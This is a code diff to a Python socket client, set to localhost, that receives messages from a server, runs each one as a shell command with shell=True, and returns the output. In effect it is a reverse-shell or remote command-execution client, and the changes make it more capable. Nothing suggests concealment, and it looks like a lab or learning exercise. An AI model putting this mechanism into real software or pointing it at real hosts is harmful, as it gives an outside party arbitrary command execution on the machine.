@@ -5,7 +5,7 @@ SERVER_HOST = "127.0.0.1"
 CLIENT_HOST = "127.0.0.1"
 PORT = 2222
 
-MAX_BYTES_REPONSE = 1024
+MAX_BYTES_REPONSE = 65536
 ENCODING = 'utf-8'
 STOP_WORD = "stop"
 
@@ -31,14 +31,14 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         if message:
             print(message)
             try:
-                result = subprocess.run(message.split(), capture_output=True, text=True, shell=True)
-            except:
+                result = subprocess.run(message, capture_output=True, text=True, shell=True, timeout=5)
+            except Exception as e:
                 # Handle errors
-                s.sendall(bytes("Not a valid command", encoding=ENCODING))
+                s.sendall(bytes(f"Error executing command: {e}", encoding=ENCODING))
                 continue
 
             # Send the stdout, and stderr to the server.
-            response = result.stdout.strip() + "\n" + result.stderr.strip()
+            response = (result.stdout + result.stderr).strip()
             s.sendall(bytes(response, encoding=ENCODING))
         else:
             s.sendall(bytes("Error with recieving message", encoding=ENCODING))
